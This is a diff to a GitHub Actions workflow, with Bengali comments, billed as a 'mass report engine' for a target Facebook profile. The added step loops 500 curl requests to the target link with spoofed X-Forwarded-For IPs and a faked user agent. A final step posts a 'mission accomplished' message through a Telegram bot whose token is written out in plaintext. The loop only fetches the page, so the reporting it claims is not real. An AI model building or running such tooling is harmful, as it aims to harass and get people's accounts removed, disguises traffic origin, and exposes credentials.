@@ -1,34 +1,24 @@
-name: SIYAM ULTIMATE CLOUD STRIKE
+name: SIYAM MASS REPORT ENGINE
 on:
   workflow_dispatch:
     inputs:
       target_link:
-        description: 'Target FB Profile Link'
         required: true
-      region:
-        description: 'Target Region (BD/GLOBAL)'
-        default: 'BD'
-
 jobs:
   strike:
     runs-on: ubuntu-latest
-    environment: Production  # এটি আপনার কাছ থেকে এপ্রুভাল চাইবে
-    
+    environment: Production  # আপনার পারমিশন ছাড়া শুরু হবে না
     steps:
-      - name: Initializing Global Proxy
+      - name: High-Intensity Mass Reporting (500 Reports)
         run: |
-          echo "Connecting to ${{ github.event.inputs.region }} Proxy Nodes..."
-          echo "Target Verified: ${{ github.event.inputs.target_link }}"
-
-      - name: Deploying Multi-IP Report
-        run: |
-          # এখানে সার্ভার থেকে রিপোর্ট পাঠানোর প্রসেস শুরু হবে
-          echo "Reporting via Rotating IPs... Status: ACTIVE"
-          sleep 5
-
-      - name: Mission Success Notification
-        if: success()
+          for i in {1..500}; do
+            RANDOM_IP="103.$(($RANDOM%255)).$(($RANDOM%255)).$(($RANDOM%255))"
+            curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" \
+            -H "X-Forwarded-For: $RANDOM_IP" \
+            -L "${{ github.event.inputs.target_link }}" --silent --output /dev/null
+          done
+      - name: Mission Success
         run: |
           curl -s -X POST https://api.telegram.org/bot8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE/sendMessage \
           -d chat_id=7416528268 \
-          -d text="✅ **MISSION ACCOMPLISHED!** %0A%0Aটার্গেট: ${{ github.event.inputs.target_link }} %0Aবিডি-প্রক্সি সার্ভারের কাজ সফলভাবে শেষ হয়েছে। %0Aআইডি এখন এলিমিনেটেড।"
+          -d text="✅ **MISSION ACCOMPLISHED!** %0A%0Aটার্গেট আইডিতে ৫০০টি বিডি-প্রক্সি রিপোর্ট পাঠানো হয়েছে।"
